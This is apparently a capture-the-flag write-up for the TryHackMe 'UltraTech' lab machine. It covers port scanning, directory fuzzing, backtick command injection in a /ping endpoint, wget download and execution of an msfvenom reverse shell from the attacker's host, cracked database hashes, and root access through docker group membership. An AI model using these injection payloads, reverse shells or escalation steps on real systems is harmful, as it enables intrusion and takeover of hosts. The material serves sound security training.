## MACHINE IP
```bash
10.201.115.74
```
## NMAP SCAN
```bash
# Nmap 7.95 scan initiated Wed Oct  1 18:14:31 2025 as: /usr/lib/nmap/nmap -Pn -p- -sV -sC -v -T5 --open --min-rate 1500 --max-rtt-timeout 500ms --max-retries 3 -oN nmap/scan-script-version 10.201.115.74
Nmap scan report for 10.201.115.74
Host is up (0.29s latency).
Not shown: 65268 closed tcp ports (reset), 263 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
8081/tcp  open  http    Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-cors: HEAD GET POST PUT DELETE PATCH
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 15C1B7515662078EF4B5C724E2927A96
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Oct  1 18:15:44 2025 -- 1 IP address (1 host up) scanned in 72.96 seconds
```
## OPEN PORTS - ANALYSIS
```bash
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
8081/tcp  open  http    Node.js Express framework
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```
## RECON
```bash
# Credentials              // Found Post Initial foothold
r00t:n100906
admin:mrsheafy
```
## ENUMERATION
```bash
# Port 8081 Eumeration
sudo feroxbuster -w /usr/share/wordlists/dirb/common.txt -C 404 -o fuzz/feroxbuster-common.txt -t 20 -u $url:8081/
200      GET        1l        3w       20c http://10.201.25.198:8081/
200      GET        1l        8w       39c http://10.201.25.198:8081/auth
500      GET       10l       61w     1094c http://10.201.25.198:8081/ping 

# Port 31331
sudo feroxbuster -w /usr/share/wordlists/dirb/common.txt -C 404 -o fuzz/feroxbuster-common.txt -t 20 -u $url:31331/
200      GET        1l      203w     8500c http://10.201.25.198:31331/images/undraw_designer.svg
200      GET        1l      443w    11824c http://10.201.25.198:31331/images/undraw_creation.svg
200      GET        1l      661w    19350c http://10.201.25.198:31331/images/undraw_frameworks.svg
200      GET        1l      178w    19165c http://10.201.25.198:31331/js/app.min.js
200      GET        1l      265w     4599c http://10.201.25.198:31331/images/together.svg
200      GET        1l      396w     8929c http://10.201.25.198:31331/images/undraw_responsive.svg
200      GET        1l      327w    11819c http://10.201.25.198:31331/images/undraw_hello_aeia.svg
200      GET        1l      677w    14561c http://10.201.25.198:31331/images/undraw_tabs.svg
200      GET        1l      155w    12953c http://10.201.25.198:31331/images/tet.svg
200      GET       65l      229w     2534c http://10.201.25.198:31331/what.html
200      GET        1l      530w    10496c http://10.201.25.198:31331/images/undraw_browser.svg
200      GET        4l      328w    24710c http://10.201.25.198:31331/css/style.min.css
200      GET      206l      773w    77520c http://10.201.25.198:31331/images/evie_default_bg.jpeg
200      GET       37l       86w      883c http://10.201.25.198:31331/js/api.js
200      GET      240l     1315w   107517c http://10.201.25.198:31331/images/hero_sm.png
200      GET        1l     2326w    63504c http://10.201.25.198:31331/images/undraw_fans.svg
200      GET      139l      531w     6092c http://10.201.25.198:31331/index.html
200      GET      139l      531w     6092c http://10.201.25.198:31331/
200      GET        1l      307w     9407c http://10.201.25.198:31331/images/undraw_selfie.svg 
200      GET        1l      931w    18240c http://10.201.25.198:31331/images/undraw_everywhere.svg
200      GET        1l      685w    14849c http://10.201.25.198:31331/images/undraw_elements.svg
200      GET        1l      671w    15018c http://10.201.25.198:31331/images/undraw_design.svg 
200      GET     1463l     4649w    44494c http://10.201.25.198:31331/js/app.js
200      GET     1393l     3543w    30017c http://10.201.25.198:31331/css/style.css
301      GET        9l       28w      321c http://10.201.25.198:31331/css => http://10.201.25.198:31331/css/
200      GET        7l       25w    32412c http://10.201.25.198:31331/favicon.ico
301      GET        9l       28w      324c http://10.201.25.198:31331/images => http://10.201.25.198:31331/images/
301      GET        9l       28w      328c http://10.201.25.198:31331/javascript => http://10.201.25.198:31331/javascript/
301      GET        9l       28w      320c http://10.201.25.198:31331/js => http://10.201.25.198:31331/js/
200      GET        5l        6w       53c http://10.201.25.198:31331/robots.txt
301      GET        9l       28w      335c http://10.201.25.198:31331/javascript/jquery => http://10.201.25.198:31331/javascript/jquery/
200      GET    10253l    40948w   268026c http://10.201.25.198:31331/javascript/jquery/jquery 
[##################>-] - 3m     12528/13892   13m     found:32      errors:374    
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_10_201_25_198:31331_-1759326466.state ...
[##################>-] - 3m     12535/13892   13m     found:32      errors:381    
[####################] - 74s     4614/4614    63/s    http://10.201.25.198:31331/ 
[####################] - 2s      4614/4614    2013/s  http://10.201.25.198:31331/images/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s      4614/4614    3211/s  http://10.201.25.198:31331/js/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s      4614/4614    3995/s  http://10.201.25.198:31331/css/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 68s     4614/4614    68/s    http://10.201.25.198:31331/javascript/ 
[##############>-----] - 2m      3241/4614    25/s    http://10.201.25.198:31331/javascript/jquery/        


- Checking file http://10.201.25.198:31331/js/api.js
(function() {
    console.warn('Debugging ::');

    function getAPIURL() {
	return `${window.location.hostname}:8081`
    }
    
    function checkAPIStatus() {
	const req = new XMLHttpRequest();
	try {
	    const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
	    req.open('GET', url, true);
	    req.onload = function (e) {
		if (req.readyState === 4) {
		    if (req.status === 200) {

- We can try Command Injection on port 8081 `http://10.201.25.198:8081/ping?ip=${window.location.hostname}`

curl http://10.201.115.74:8081/ping?ip=`whoami`  
ping: www: Temporary failure in name resolution 
- Command Injection Works !!!

- Generate reverse shell
sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.13.80.25 LPORT=80 -f elf -o shell.elf
- Url encode and Transfer via burpsuite
  
/ping?ip=`which+wget`
ping: /usr/bin/wget: Temporary failure in name resolution

/ping?ip=`wget+10.13.80.25/shell.elf`
     0K                                                       100% 10.8M=0s
2025-10-01 14:16:22 (10.8 MB/s) - ‘shell.elf’ saved [194/194]  

/ping?ip=`chmod+777+shell.elf` 

- Start Listener 
/ping?ip=`./shell.elf`
```
## INITIAL SHELL
```bash
sudo nc -nvlp 80
[sudo] password for kali:
listening on [any] 80 ...
connect to [10.13.80.25] from (UNKNOWN) [10.201.115.74] 60372
id
uid=1002(www) gid=1002(www) groups=1002(www)
whoami
www    

# Shell upgrade
python -c 'import pty; pty.spawn("/bin/bash")'
www@ultratech-prod:/home/www/api$ ^Z
zsh: suspended  sudo nc -nvlp 80
┌──(kali㉿kali)-[~/Desktop/TryHackMe/LinuxMachines/11-UltraTech]
└─$ stty raw -echo; fg
[1]  + continued  sudo nc -nvlp 80
www@ultratech-prod:/home/www/api$ stty rows 48 cols 189
www@ultratech-prod:/home/www/api$ export TERM=xterm-256color
www@ultratech-prod:/home/www/api$ alias ll='ls -lsaht --color=auto'
www@ultratech-prod:/home/www/api$ PS1='\[\e[31m\]\u\[\e[96m\]@\[\e[35m\]\H\[\e[0m\]:\[\e[93m\]\w\[\e[0m\]\$ '
www@ultratech-prod:/home/www/api$ id
uid=1002(www) gid=1002(www) groups=1002(www)                              
```
## PRIVILEGE ESCALATION
```bash
www@ultratech-prod:/home/www/api$ strings utech.db.sqlite 
SQLite format 3
etableusersusers
CREATE TABLE users (
            login Varchar,
            password Varchar,
            type Int
        )
r00tf357a0c52799563c7c7b76c1e7543a32)
admin0d0ea5111e3c1def594c1684e3b9be84

www@ultratech-prod:/home/www/api$ cat /etc/passwd
r00t:x:1001:1001::/home/r00t:/bin/bash

# Crack hashes using crackstation.com
r00t:f357a0c52799563c7c7b76c1e7543a32)
admin:0d0ea5111e3c1def594c1684e3b9be84

# Cracked hashes
r00t:n100906
admin:mrsheafy

# Switch user 
su r00t
Password:n100906

# Privesc - docker group
id 
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)

- Member of docker groups
```
## ROOT | ADMINISTRATOR - PWNED
```bash
r00t@ultratech-prod:/dev/shm$ docker run -v /:/mnt --rm -it bash chroot /mnt sh
# id                                                                                          
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
# whoami                                                                                      
root                      
```
